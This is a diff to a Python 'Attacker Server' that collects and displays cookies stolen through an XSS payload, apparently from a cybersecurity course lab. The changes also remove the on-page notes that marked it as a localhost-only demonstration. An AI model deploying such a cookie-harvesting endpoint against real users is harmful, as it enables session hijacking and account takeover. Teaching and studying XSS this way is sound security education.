@@ -8,8 +8,10 @@ from datetime import datetime
 import os
 
 PORT = 9000
-STOLEN_FILE = "stolen_cookies.txt"
-IMAGE_FILE  = "cookie_monster.png"
+# נתיב מוחלט — תמיד יחסית לתיקייה שבה נמצא הסקריפט
+BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
+STOLEN_FILE  = os.path.join(BASE_DIR, "stolen_cookies.txt")
+IMAGE_FILE   = os.path.join(BASE_DIR, "cookie_monster.png")
 
 
 def load_stolen():
@@ -38,12 +40,10 @@ def build_main_page(cookies):
     else:
         rows = "<li>No cookies yet — send a payload from the blog.</li>"
 
-    # If there's a picture, it saves it. Otherwise it shows a message.
+    # If there's a picture, show it
     image_html = ""
     if os.path.exists(IMAGE_FILE):
         image_html = '<img src="/cookie_monster.png" alt="Cookie Monster" style="width:200px; margin-top:20px;">'
-    else:
-        image_html = '<p style="color:#888;">[cookie_monster.png not found — you can add it manually to the folder]</p>'
 
     return f"""<!DOCTYPE html>
 <html lang="en">
@@ -60,7 +60,6 @@ def build_main_page(cookies):
 </head>
 <body>
   <h1>🍪 Attacker Server</h1>
-  <div class="info">This server simulates an attacker collecting cookies stolen from the vulnerable blog.</div>
 
   <h2>Stolen Cookies</h2>
   <ul>
@@ -69,8 +68,6 @@ def build_main_page(cookies):
 
   {image_html}
 
-  <hr>
-  <small>Demonstration project — Cybersecurity Course | localhost only</small>
 </body>
 </html>"""
 
@@ -95,20 +92,25 @@ class AttackerHandler(BaseHTTPRequestHandler):
             raw = params.get("cookie", [""])[0]
             cookie_value = unquote(raw)  # URL-decode
 
-            if cookie_value:
-                save_cookie(cookie_value)
-                print(f"[Attacker] *** COOKIE STOLEN: {cookie_value}")
-                response = f"""<!DOCTYPE html>
-<html><body>
-<p>Cookie received: <code>{cookie_value}</code></p>
-</body></html>"""
-            else:
-                response = "<html><body><p>No cookie received.</p></body></html>"
+            # שומר תמיד — גם אם הערך ריק, כדי לראות שהבקשה הגיעה
+            save_cookie(cookie_value if cookie_value else "(empty cookie)")
+            print(f"[Attacker] *** COOKIE STOLEN: '{cookie_value}'")
 
+            # מציג דף אישור — ללא redirect חזרה לבלוג (כדי למנוע לופ)
+            response = f"""<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Cookie Stolen!</title>
+<style>body{{font-family:Arial,sans-serif;max-width:600px;margin:60px auto;text-align:center;}}
+h1{{color:#8e44ad;}} code{{background:#eee;padding:4px 8px;border-radius:4px;}}</style>
+</head>
+<body>
+<h1>🍪 Cookie Stolen!</h1>
+<p>Received cookie:</p>
+<p><code>{cookie_value if cookie_value else "(empty)"}</code></p>
+<p><a href="/">← View all stolen cookies</a></p>
+</body></html>"""
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
-            # Allows the browser to receive the response even from cross-origin Image() calls
-            self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
             self.wfile.write(response.encode("utf-8"))
 
